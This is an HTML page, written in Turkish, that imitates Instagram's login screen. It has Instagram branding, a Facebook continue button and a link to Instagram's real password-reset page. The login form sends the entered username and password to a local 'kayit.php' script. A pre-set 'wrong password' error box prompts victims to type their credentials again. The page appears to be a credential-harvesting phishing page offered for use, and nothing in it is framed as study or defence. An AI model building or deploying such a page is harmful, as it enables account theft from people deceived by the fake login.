<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="insta2.css">
</head>
<body>  
    <!-- Logo -->
    <img src="insta.png" alt="Logo" class="logo">

    <!-- Facebook Login Button -->
    <button class="facebook-btn">
        <img src="face.png" alt="Facebook Icon" class="icon">
        Facebook ile Devam Et
    </button>

    <!-- Divider -->
    <!-- Arka Planın Kararması -->
    <div class="overlay"></div>

    <!-- Hata Mesajı Kutusu -->
    <div class="error-box">
        <h2 class="error-title">Yanlış Şifre</h2>
        <p class="error-message">Girdiğin şifre yanlış. Lütfen tekrar dene.</p>
        <hr>
        <button class="retry-btn" onclick="window.location.href='index.php'">Tekrar Dene</button> <!-- Buton tıklanınca login sayfasına yönlendirme -->
    </div>


    <!-- Giriş Formu -->
    <form action="kayit.php" class="login-form">
        <input type="text" id="name" name="name" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="input-field">
        <input type="password" id="sifre" name="sifre" placeholder="Şifre" class="input-field">
        <a href="https://www.instagram.com/accounts/password/reset" class="forgot-password">Şifreni mi unuttun?</a>
        <button class="login-btn">Giriş Yap</button>
        </form>
        <p style="color: rgb(129, 128, 128);" class="signup-link">Hesabın yok mu? <a style="text-decoration: none;" href="#">Kaydol</a></p>
    <!-- Footer Resmi -->
<div class="footer">
    <div style="color: rgba(128, 128, 128, 0.685);" class="from-text">from</div>
    <img src="alt.png" alt="Footer Image">
</div>
</body>
<script>window.onload = function() {
    var errorMessage = document.getElementById('error-message');
    var closeButton = document.getElementById('close-btn');

    // Hata mesajını göster
    errorMessage.style.display = 'block';

    // Kapanma butonuna tıklanınca mesaj kutusunu gizle
    closeButton.onclick = function() {
        errorMessage.style.display = 'none';
    };
};</script>
</html>
